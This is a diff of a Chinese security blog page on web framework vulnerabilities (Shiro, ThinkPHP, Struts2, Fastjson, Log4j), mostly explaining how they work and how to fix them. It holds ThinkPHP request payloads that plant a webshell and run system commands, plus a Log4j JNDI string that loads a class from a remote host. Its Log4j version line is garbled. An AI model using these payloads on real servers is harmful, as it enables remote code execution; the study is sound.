@@ -196,20 +196,20 @@
       <div class="col-xl-6"><article class="article">
   <div class="wrap">
     <section class="head">
-  <img   class="lazyload" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2xldGUxMTQvQ0ROQDMuMC9Cb0JvUGljLzIzLmpwZw?x-oss-process=image/format,png.30" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <img   class="lazyload" data-original="/images/cover/eight.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
     <h1 class="head-title">框架及其漏洞</h1>
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>May 25, 2023</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1044</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3174</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
         
-        <h2 id="1-Apache-Shiro"><a href="#1-Apache-Shiro" class="headerlink" title="1.Apache Shiro"></a>1.Apache Shiro</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/blog\source_posts\2023\5\25\image-20230525204238959.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20230525204238959"></p>
+        <h2 id="1-Apache-Shiro"><a href="#1-Apache-Shiro" class="headerlink" title="1.Apache Shiro"></a>1.Apache Shiro</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/image-20230525204238959.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><h4 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h4><p>1、首先拿到一个登录框，输入信息，勾选Remember Me后提交。</p>
 <p>2、抓包，查看返回的数据包中set-Cookie字段存在remenberme=deleteme(判断存在漏洞)</p>
 <p>3、使用ysoserial中的监听模块，监听6666端口(为第5步拿到密钥做准备)</p>
@@ -220,7 +220,7 @@
 <p>2、拿到rememberMe cookie后，用它作为Padding Oracle攻击的前缀；</p>
 <p>3、打开ysoserial工具，加密一条Java序列化Payload，构造恶意rememberMe；</p>
 <p>4、最后使用构造好的恶意rememberMe重新请求网站，进行反序列化攻击，最终导致远程代码执行。</p>
-<h2 id="2-ThinkPHP"><a href="#2-ThinkPHP" class="headerlink" title="2.ThinkPHP"></a>2.ThinkPHP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/blog\source_posts\2023\5\25\image-20230525204632850.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20230525204632850"></p>
+<h2 id="2-ThinkPHP"><a href="#2-ThinkPHP" class="headerlink" title="2.ThinkPHP"></a>2.ThinkPHP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/image-20230525204632850.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20230525204632850"></p>
 <h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><p>1、植入一句话木马(写在url中)</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.xx.xx/public/index.php?s=/index/%5Cthink%5Capp/inv">http://192.168.xx.xx/public/index.php?s=/index/\think\app/inv</a></p>
 <p>okefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php </p>
@@ -231,6 +231,34 @@
 <p>_method=_construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</p>
 <p>4、POST利用方法二(写在请求正文中)</p>
 <p>a=system&amp;b=whoami&amp;_method=filter</p>
+<h2 id="3-Struts2"><a href="#3-Struts2" class="headerlink" title="3.Struts2"></a>3.Struts2</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/image-20230525205440744.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20230525205440744"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h4 id="st2-045"><a href="#st2-045" class="headerlink" title="st2-045"></a>st2-045</h4><p>Struts2默认使用org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类对上传数据进行解析，其在处理Content-Type时如果获得非预期的值的话，将会抛出一个异常。在处理异常的过程中会对错误信息进行OGNL表 达式解析。如果错误信息中包含恶意语句，语句将被执行。</p>
+<h4 id="【重要】S2-062远程命令执行-cve-2021-31805"><a href="#【重要】S2-062远程命令执行-cve-2021-31805" class="headerlink" title="【重要】S2-062远程命令执行(cve-2021-31805)"></a>【重要】S2-062远程命令执行(cve-2021-31805)</h4><p>该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。</p>
+<p>在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。</p>
+<h5 id="原理：开发人员使用-…-语法进行强制"><a href="#原理：开发人员使用-…-语法进行强制" class="headerlink" title="原理：开发人员使用%{…} 语法进行强制"></a>原理：开发人员使用%{…} 语法进行强制</h5><p>OGNL 解析，有一些特殊的TAG属性可以执行二次解析。对不受信任的用户输入使用强制 OGNL 解析</p>
+<p>1、这些 </p>
+<p>UIBean 元素最终对 </p>
+<p>name 属性执行第二次 </p>
+<p>OGNL 评估，</p>
+<p>因为“ value”属性不存在并且它试图填充该属性。因此，通过给所有属性一个空白值 =“” ，这将有助于缓解这个问题。（例如：&lt;s:label</p>
+<p>name= “%{skillName}”value= “” /&gt;</p>
+<p>2、将 org.apache.commons.collection.BeanMap 添加到 Struts2 沙箱的 excludeClasses 列表将排除直接使用它</p>
+<h2 id="4-Fastjson"><a href="#4-Fastjson" class="headerlink" title="4.Fastjson"></a>4.Fastjson</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p><img   class="lazyload" data-original="/2023/05/25/2023/5/25/image-20230525210924236.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20230525210924236"></p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>1、只要我们传入一个json类型数据包含@type，程序在调用JSON.parseObject这个方法处理json对象时，程序就会反序列化生成一个对象。因此，了解了Fastjson处理json的机制，攻击者只需要将@type值设为TemplatesImpl，构造一个恶意类，而这个类还有一个字段是_bytecodes，程序根据_bytecodes生成了一个java实例。问题就在于java实例生成的同时，会自动调用构造函数。那么攻击者只要把恶意代码赋值给_bytecodes字段，恶意代码就会执行。</p>
+<p>2、Fastjson 在对 javaBean 进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的 set 方法，如果这个 set 方法中含有些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令。</p>
+<h2 id="5-Apache-Log4j"><a href="#5-Apache-Log4j" class="headerlink" title="5.Apache Log4j"></a>5.Apache Log4j</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache Log4j 2.x&lt;★Apache Shiro★=2.14.1</p>
+<h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><p>​    黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。</p>
+<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理分三个模块：${…}表达式、log4j的递归解析机制、Jndi注入</p>
+<h4 id="原理一"><a href="#原理一" class="headerlink" title="原理一"></a>原理一</h4><p>MessagePatternConverter类的format()方法一旦遇见日志中包含”${“ ，就会将表达式的内容替换为表达式解析后的内容，而不是表达式</p>
+<p>本身。那么，攻击者只需构造形如”${…}”的表达式，只要表达式符合要求，系统就会执行。</p>
+<h4 id="原理二"><a href="#原理二" class="headerlink" title="原理二"></a>原理二</h4><p>StrSubstitutor类中提取参数并通过lookup对象进行内容替换，当日志遇到”${“时，Interpolator类以” : “号作为分割，将表达式内容分割成两部分。前部分作为prefix(前缀)，后部分作为key(要执行的语句)。然后通过prefix去找对应的lookup对象，通过对应的lookup实例调</p>
+<p>用其自身的方法，最后将key作为参数带入执行。</p>
+<h4 id="原理三"><a href="#原理三" class="headerlink" title="原理三"></a>原理三</h4><p>Jndi注入原理就是poc（写好的代码）中${jndi:ldap://192.168.xx.xx/exp}的jndi变量可控。攻击者远程加载一个恶意class文件，当其中的恶意语句被传入到log4j日志文件时，lookup将恶意语句注入到${jndi:ldap://…}中。接着程序通过ldap协议访问192.168.xx.xx这个地址中包含java代码的class文件，从而达成漏洞利用目的。</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>1、添加jvm启动参数-D log4j2.formatMsgNoLookups=true</p>
+<p>2、在应用classpath下添加log4j2.component.properties配置文件，</p>
+<p>文件内容为1中的指令。</p>
+<p>3、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p>
+<p>4、部署使用第三方防火墙产品进行安全防护。</p>
 
       </section>
       <section class="extra">
@@ -263,7 +291,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Apache-Shiro"><span class="toc-text">1.Apache Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro-550"><span class="toc-text">Shiro-550</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro-721"><span class="toc-text">Shiro-721</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ThinkPHP"><span class="toc-text">2.ThinkPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="toc-text">利用过程</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Apache-Shiro"><span class="toc-text">1.Apache Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro-550"><span class="toc-text">Shiro-550</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shiro-721"><span class="toc-text">Shiro-721</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ThinkPHP"><span class="toc-text">2.ThinkPHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Struts2"><span class="toc-text">3.Struts2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-2"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#st2-045"><span class="toc-text">st2-045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E9%87%8D%E8%A6%81%E3%80%91S2-062%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2021-31805"><span class="toc-text">【重要】S2-062远程命令执行(cve-2021-31805)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E4%BD%BF%E7%94%A8-%E2%80%A6-%E8%AF%AD%E6%B3%95%E8%BF%9B%E8%A1%8C%E5%BC%BA%E5%88%B6"><span class="toc-text">原理：开发人员使用%{…} 语法进行强制</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Fastjson"><span class="toc-text">4.Fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-3"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Apache-Log4j"><span class="toc-text">5.Apache Log4j</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="toc-text">执行逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%B8%80"><span class="toc-text">原理一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BA%8C"><span class="toc-text">原理二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%B8%89"><span class="toc-text">原理三</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li></ol>
   </aside>
 
         
